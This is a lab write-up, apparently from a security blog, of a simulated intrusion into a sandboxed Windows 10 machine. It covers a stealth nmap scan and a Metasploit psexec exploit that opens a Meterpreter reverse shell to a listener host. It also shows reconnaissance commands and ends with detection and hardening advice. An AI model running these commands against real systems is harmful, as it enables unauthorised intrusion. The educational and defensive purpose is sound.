# OP-REPORT: Infiltrating the Windows Outpost (Adversary Simulation)

> **CLEARANCE LEVEL:** UNCLASSIFIED / EDUCATIONAL ONLY
> **TARGET ASSET:** Isolated Windows 10 Sandbox (Local IP: `192.168.1.45`)
> **OBJECTIVE:** Initial Access, Internal Reconnaissance, and Log Evasion.

---

## 1. Mission Briefing

In modern cyber warfare, penetrating the perimeter is only the first step. The true test of an adversary is what they do once they land inside the enemy network. This simulation demonstrates a **"low and slow"** infiltration into an isolated Windows 10 outpost, mirroring the tactics used by **Advanced Persistent Threats (APTs)** to gain a foothold without triggering alarms.

> **⚠️ NOTICE:** All exercises were conducted in a strictly controlled, air-gapped laboratory environment. Do **not** attempt any of these techniques on systems you do not own or have explicit authorization to test.

![Tactical Cyber Screen](/images/tactical-screen.png)

---

## 2. Phase One: Silent Reconnaissance (Mapping the Outpost)

Before storming the gates, we must map the perimeter. Instead of aggressive, noisy port scans that would instantly alert the Blue Team's **IDS (Intrusion Detection System)**, we utilize a **stealth TCP SYN scan** targeting only specific high-value ports.

```bash
# Executing a stealth scan against the outpost
# -sS: TCP SYN scan (half-open, stealthier than full connect)
# -T2:  Polite timing to avoid triggering rate-based alerts
nmap -sS -p 139,445,3389 -T2 192.168.1.45
```

### Intelligence Gathered

| Port | Service | Status | Risk Assessment |
|------|---------|--------|-----------------|
| 139  | NetBIOS | Closed | — |
| 445  | SMB     | **Open** | High — potential lateral movement vector |
| 3389 | RDP     | **Open** | High — remote access gateway |

Port **445 (SMB)** is exposed, presenting a significant attack surface. Port **3389 (RDP)** is actively listening, which could serve as an alternative entry point or post-exploitation pivot.

---

## 3. Phase Two: The Breach (Initial Access)

With SMB exposed, we identified a **legacy vulnerability** in the file-sharing service (simulated). We deploy our payload to establish a **reverse shell** — effectively turning an enemy guard into our inside informant.

```bash
# Launching Metasploit and configuring the exploit module
msfconsole -q

msf6 > use exploit/windows/smb/psexec
msf6 exploit(psexec) > set RHOSTS 192.168.1.45
msf6 exploit(psexec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(psexec) > set LHOST 192.168.1.10
msf6 exploit(psexec) > exploit
```

> **✅ STATUS:** Link Established. We are inside the outpost.

A **Meterpreter session** is now active, providing us with an encrypted, in-memory command channel that leaves minimal forensic footprint on the target's disk.

---

## 4. Phase Three: Interrogation (Post-Exploitation)

Now that we have a foothold, we must interrogate the machine to understand our environment before making **lateral movements**. We avoid dropping new executable files to disk; instead, we **"live off the land" (LOLBins)** using built-in Windows commands — a technique that blends our activity with legitimate system operations.

```cmd
C:\> whoami /priv
C:\> net user
C:\> arp -a
C:\> ipconfig /all
C:\> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

### Key Findings

- **`whoami /priv`** — Confirmed we are operating under **standard user privileges** (no `SeDebugPrivilege`). Privilege escalation would be required for deeper access.
- **`net user`** — Enumerated all local accounts, identifying potential high-value targets for credential harvesting.
- **`arp -a`** — Mapped the local network topology, revealing **3 additional hosts** on the same subnet — potential candidates for lateral movement.
- **`ipconfig /all`** — Exposed the **complete network configuration**, including the **primary DNS suffix**, which confirmed whether the outpost is joined to a broader **Active Directory domain**.
- **`systeminfo | findstr...`** — Extracted the **exact OS build version** and **system architecture (x64)**. This **fingerprinting** is critical for identifying compatible **Local Privilege Escalation (LPE)** exploits.

> The outpost perimeter is secure, but we have established our **beachhead**.

---

## 5. Counter-Intelligence (Defensive Posture)

A successful Red Team operation is useless without strengthening the Blue Team. Here is how the outpost defenders **could have detected** our infiltration:

### 🔍 Detection Opportunities

| Defense Layer | Recommendation |
|---------------|----------------|
| **Event Logging** | Monitor **Event ID 4624** — Successful network logon events (Type 3) from unknown or unauthorized subnets should trigger immediate alerts. |
| **Sysmon** | Deploy **Sysmon** with a tuned configuration. Our reverse shell would have been flagged by **Event ID 1** (Process Creation) and **Event ID 3** (Network Connection), exposing the C2 IP address. |
| **SMB Hardening** | **Disable SMBv1/v2** entirely. Legacy protocols are the primary gateways for lateral movement. Enforce only digitally signed **SMBv3** traffic. |
| **Network Segmentation** | Isolate high-value assets behind internal firewalls. Even if one outpost falls, lateral movement should be contained. |
| **EDR** | Endpoint Detection & Response solutions would have flagged the in-memory Meterpreter payload through behavioral analysis, even without a signature match. |

### 📋 Quick Hardening Checklist

- [ ] Audit and disable all unnecessary open ports (especially **445** and **3389**)
- [ ] Enable **Windows Defender Credential Guard** to prevent credential dumping
- [ ] Deploy **Sysmon** with a community-maintained config (e.g., SwiftOnSecurity/sysmon-config)
- [ ] Enforce **Network Level Authentication (NLA)** for all RDP connections
- [ ] Implement **LAPS (Local Administrator Password Solution)** to randomize local admin credentials

---

## 6. Conclusion

This exercise demonstrates that even a single misconfigured service — an open SMB port running a legacy protocol — can provide an attacker with a complete foothold inside a network. The tools and techniques used here are **well-documented and widely available**, which means defenders must assume adversaries already know them.

The best defense is not a single tool, but a **layered security posture**: network segmentation, continuous monitoring, endpoint hardening, and most importantly — **a trained Blue Team that knows what to look for**.

---

> **📌 END OF REPORT**
> *Classification: UNCLASSIFIED / EDUCATIONAL*
> *Distribution: Unlimited*
